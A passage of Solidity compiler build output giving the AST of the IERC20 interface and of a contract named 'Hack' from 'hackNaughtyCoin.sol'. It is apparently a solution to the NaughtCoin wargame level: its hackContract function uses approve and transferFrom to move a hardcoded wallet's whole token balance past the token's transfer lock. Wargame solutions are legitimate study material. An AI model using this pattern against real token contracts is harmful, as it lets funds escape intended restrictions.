										"src": "1611:9:0"
									},
									"scope": 77,
									"src": "1538:83:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 55,
										"nodeType": "StructuredDocumentation",
										"src": "1627:642:0",
										"text": " @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 64,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2291:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 56,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2291:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2308:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2308:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2290:33:0"
									},
									"returnParameters": {
										"id": 63,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 62,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 64,
												"src": "2342:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 61,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2342:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2341:6:0"
									},
									"scope": 77,
									"src": "2274:74:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 65,
										"nodeType": "StructuredDocumentation",
										"src": "2354:287:0",
										"text": " @dev Moves `amount` tokens from `from` to `to` using the\n allowance mechanism. `amount` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 76,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2677:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 66,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2677:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 69,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2699:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 68,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2699:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 71,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2719:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 70,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2667:72:0"
									},
									"returnParameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 74,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "2758:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 73,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2758:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2757:6:0"
									},
									"scope": 77,
									"src": "2646:118:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "202:2564:0"
						}
					],
					"src": "106:2661:0"
				},
				"id": 0
			},
			"contracts/hackNaughtyCoin.sol": {
				"ast": {
					"absolutePath": "contracts/hackNaughtyCoin.sol",
					"exportedSymbols": {
						"Hack": [
							144
						],
						"IERC20": [
							77
						]
					},
					"id": 145,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"id": 79,
							"nodeType": "ImportDirective",
							"scope": 145,
							"sourceUnit": 78,
							"src": "33:56:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"id": 80,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "91:23:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 144,
							"linearizedBaseContracts": [
								144
							],
							"name": "Hack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "14f719d0",
									"id": 83,
									"mutability": "mutable",
									"name": "naughtyCoin",
									"nodeType": "VariableDeclaration",
									"scope": 144,
									"src": "136:25:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_IERC20_$77",
										"typeString": "contract IERC20"
									},
									"typeName": {
										"id": 82,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 81,
											"name": "IERC20",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 77,
											"src": "136:6:1"
										},
										"referencedDeclaration": 77,
										"src": "136:6:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IERC20_$77",
											"typeString": "contract IERC20"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 86,
									"mutability": "mutable",
									"name": "myWallet",
									"nodeType": "VariableDeclaration",
									"scope": 144,
									"src": "168:61:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 84,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "168:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307864423031643934323137333038303436613739324438363462313641333538333761613532423836",
										"id": 85,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "187:42:1",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0xdB01d94217308046a792D864b16A35837aa52B86"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 97,
										"nodeType": "Block",
										"src": "266:49:1",
										"statements": [
											{
												"expression": {
													"id": 95,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 91,
														"name": "naughtyCoin",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 83,
														"src": "277:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_IERC20_$77",
															"typeString": "contract IERC20"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 93,
																"name": "_address",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 88,
																"src": "298:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 92,
															"name": "IERC20",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 77,
															"src": "291:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_IERC20_$77_$",
																"typeString": "type(contract IERC20)"
															}
														},
														"id": 94,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "291:16:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_IERC20_$77",
															"typeString": "contract IERC20"
														}
													},
													"src": "277:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_IERC20_$77",
														"typeString": "contract IERC20"
													}
												},
												"id": 96,
												"nodeType": "ExpressionStatement",
												"src": "277:30:1"
											}
										]
									},
									"id": 98,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 89,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 88,
												"mutability": "mutable",
												"name": "_address",
												"nodeType": "VariableDeclaration",
												"scope": 98,
												"src": "248:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 87,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "248:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "247:18:1"
									},
									"returnParameters": {
										"id": 90,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "266:0:1"
									},
									"scope": 144,
									"src": "236:79:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 112,
										"nodeType": "Block",
										"src": "366:88:1",
										"statements": [
											{
												"assignments": [
													104
												],
												"declarations": [
													{
														"constant": false,
														"id": 104,
														"mutability": "mutable",
														"name": "amount",
														"nodeType": "VariableDeclaration",
														"scope": 112,
														"src": "377:11:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 103,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "377:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 109,
												"initialValue": {
													"arguments": [
														{
															"id": 107,
															"name": "myWallet",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 86,
															"src": "413:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"id": 105,
															"name": "naughtyCoin",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 83,
															"src": "391:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 106,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 34,
														"src": "391:21:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 108,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "391:31:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "377:45:1"
											},
											{
												"expression": {
													"id": 110,
													"name": "amount",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 104,
													"src": "440:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 102,
												"id": 111,
												"nodeType": "Return",
												"src": "433:13:1"
											}
										]
									},
									"functionSelector": "b69ef8a8",
									"id": 113,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "balance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 99,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "337:2:1"
									},
									"returnParameters": {
										"id": 102,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 101,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 113,
												"src": "361:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 100,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "361:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "360:6:1"
									},
									"scope": 144,
									"src": "321:133:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 142,
										"nodeType": "Block",
										"src": "491:179:1",
										"statements": [
											{
												"assignments": [
													117
												],
												"declarations": [
													{
														"constant": false,
														"id": 117,
														"mutability": "mutable",
														"name": "balancet",
														"nodeType": "VariableDeclaration",
														"scope": 142,
														"src": "502:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 116,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "502:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 120,
												"initialValue": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 118,
														"name": "balance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 113,
														"src": "518:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
															"typeString": "function () view returns (uint256)"
														}
													},
													"id": 119,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "518:9:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "502:25:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 126,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "566:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Hack_$144",
																		"typeString": "contract Hack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Hack_$144",
																		"typeString": "contract Hack"
																	}
																],
																"id": 125,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "558:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 124,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "558:7:1",
																	"typeDescriptions": {}
																}
															},
															"id": 127,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "558:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 128,
															"name": "balancet",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 117,
															"src": "573:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 121,
															"name": "naughtyCoin",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 83,
															"src": "538:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 123,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 64,
														"src": "538:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 129,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "538:44:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 130,
												"nodeType": "ExpressionStatement",
												"src": "538:44:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 134,
															"name": "myWallet",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 86,
															"src": "618:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 137,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "636:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Hack_$144",
																		"typeString": "contract Hack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Hack_$144",
																		"typeString": "contract Hack"
																	}
																],
																"id": 136,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "628:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 135,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "628:7:1",
																	"typeDescriptions": {}
																}
															},
															"id": 138,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "628:13:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 139,
															"name": "balancet",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 117,
															"src": "643:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 131,
															"name": "naughtyCoin",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 83,
															"src": "593:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$77",
																"typeString": "contract IERC20"
															}
														},
														"id": 133,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 76,
														"src": "593:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "593:59:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 141,
												"nodeType": "ExpressionStatement",
												"src": "593:59:1"
											}
										]
									},
									"functionSelector": "7ca2474e",
									"id": 143,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "hackContract",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 114,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "481:2:1"
									},
									"returnParameters": {
										"id": 115,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "491:0:1"
									},
									"scope": 144,
									"src": "460:210:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 145,
							"src": "116:563:1"
						}
					],
					"src": "33:646:1"
				},
				"id": 1
			}
		}
	}
}